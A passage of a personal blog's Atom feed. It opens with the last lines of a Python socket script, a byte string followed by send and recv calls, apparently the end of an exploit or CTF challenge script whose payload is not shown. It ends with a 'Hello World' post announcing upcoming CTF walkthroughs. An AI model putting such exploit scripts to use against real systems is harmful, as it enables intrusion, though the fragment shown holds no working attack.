</span><span class="line"><span class="s">&quot;</span><span class="se">\x80</span><span class="s">&quot;</span>
</span><span class="line"><span class="p">)</span>
</span><span class="line"><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
</span><span class="line"><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hello World]]></title>
    <link href="http://swappage.github.io/blog/2014/09/23/hello-world/"/>
    <updated>2014-09-23T21:20:47+02:00</updated>
    <id>http://swappage.github.io/blog/2014/09/23/hello-world</id>
    <content type="html"><![CDATA[<p>Hello there!</p>

<p>It looks like i made up my mind and started a blog!.</p>

<p><em>*lier*</em></p>

<p>Ok ok, you are right… the truth is that i started playing around with Markdown and octopress, and i wanted to try publishing something :)</p>

<p>What’s going to be published here?</p>

<p>Well, pretty much everything that comes in my mind, things that i found interesting, reserches that I might be working on, games i play..</p>

<p>Oh right, I recently got an addiction for hacking games and competitions, so you will probably see some walkthroughs of challenges and problems from various CTF games..</p>

<p>mhh yep, pretty much it for now.
See you soon :)</p>

]]></content>
  </entry>
  
</feed>
